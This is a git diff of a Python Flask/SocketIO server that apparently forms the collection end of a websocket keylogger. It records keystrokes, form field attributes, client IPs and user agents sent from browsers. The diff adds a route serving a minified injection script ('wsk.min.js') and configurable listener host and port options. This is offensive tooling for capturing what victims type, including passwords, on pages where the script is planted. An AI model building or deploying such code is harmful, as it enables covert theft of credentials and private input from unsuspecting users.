@@ -7,27 +7,21 @@ from flask.ext.socketio import SocketIO, emit
 from aux import pprint
 from datetime import datetime
 
-
-#rightnow = datetime.now()
-#rightnow = rightnow.strftime('%Y/%m/%d %H:%M:%S')
-#logfile = 'wskeylogger-%s.log' % rightnow
 logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret'
-app.config['DEBUG'] = False
 socketio = SocketIO(app)
-
 hosts = {}
-configs = {
-    'user_agents' : False,
-    'clients' : False,
-    'hosts' : False,
-}
+configs = None
 
 @app.route('/')
 def index():
     return render_template('index.html')
+
+@app.route('/wsk')
+def wsk():
+    return app.send_static_file('static/js/wsk.min.js')
 
 @socketio.on('connect', namespace='/test')
 def test_connect():
@@ -116,11 +110,12 @@ def keydown(message):
 
     
     keylog_entry = []
-    if configs['hosts']:
+    configs = app.config['user_configs']
+    if configs['show_hosts']:
         keylog_entry.append(host)
-    if configs['clients']:
+    if configs['show_clients']:
         keylog_entry.append(ip)
-    if configs['user_agents']:
+    if configs['show_user_agents']:
         keylog_entry.append(message['page_details']['user_agent'])
 
     keylog_entry.append('<%s id="%s" class="%s" name="%s"> textval: %s' %\
@@ -131,8 +126,11 @@ def keydown(message):
          ''.join(contents)))
 
     keylog_entry = ' '.join(keylog_entry)
-    #logging.log(keylog_entry)
     print keylog_entry
 
-if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=80)
+
+def run(configs):
+
+    app.config['user_configs'] = configs
+    app.config['DEBUG'] = configs['debug']
+    socketio.run(app, host=configs['lhost'], port=configs['lport']) 
